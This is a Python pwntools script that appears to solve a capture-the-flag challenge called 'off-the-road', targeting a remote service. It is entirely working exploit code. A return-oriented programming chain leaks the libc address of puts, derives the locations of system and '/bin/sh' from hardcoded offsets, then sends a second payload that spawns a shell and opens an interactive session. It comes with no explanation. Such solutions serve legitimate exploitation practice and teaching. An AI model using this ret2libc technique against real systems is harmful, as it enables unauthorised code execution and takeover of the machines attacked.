
#!/usr/bin/env python3

from pwn import *
from time import sleep

HOST = "pwn.pwnme.fr"
PORT = 7010

exe = ELF("./off-the-road")

libc = ELF("./libc-2.27.so")

context.log_level = 'info'
context.arch = 'amd64'
context.binary = exe.path

def conn():
    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process(["strace", "-o", "strace.out", "./off-the-road"])

    return r


def main():
    global r

    pop_rdi = 0x4013b3 # pop rdi ; ret
    puts_plt = 0x401060
    puts_got = 0x404018
    main = 0x4012df
    get_input = 0x40117b
    ret = 0x40101a


    if args.REMOTE:
        sys_libc = 0x4f420
        puts_libc = 0x80970
        bin_sh_libc = 0x1b3d88
    else:
        sys_libc = 0x48e50
        puts_libc = 0x0765f0
        bin_sh_libc = 0x18a152

    payload = b""
    payload += p64(ret) * (32 - 4)

    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(get_input)
    payload += b"\x00"

    r = conn()

    rep = r.recvuntil(b'Good luck ;)\n')
    print(rep)

    r.send(payload)

    rep = r.recv()

    try:
        leak = rep.split(b"\n")[0].strip().ljust(8,b'\x00')
        log.success("Leak puts@libc : " + hex(u64(leak)))
    except:
        exit(0)

    offset = u64(leak) - puts_libc
    sys = offset + sys_libc
    bin_sh = offset + bin_sh_libc

    payload2 = b""
    payload2 += p64(ret) * (32-5)
    payload2 += b"CCCCCCCC"
    payload2 += p64(pop_rdi)
    payload2 += p64(bin_sh)
    payload2 += p64(sys)
    payload2 += b"CCCCCCCC"  # try some stuffs for stack alignement needed by sys
    payload2 += b"\x08"

    r.send(payload2)

    r.interactive()


if __name__ == "__main__":
    main()
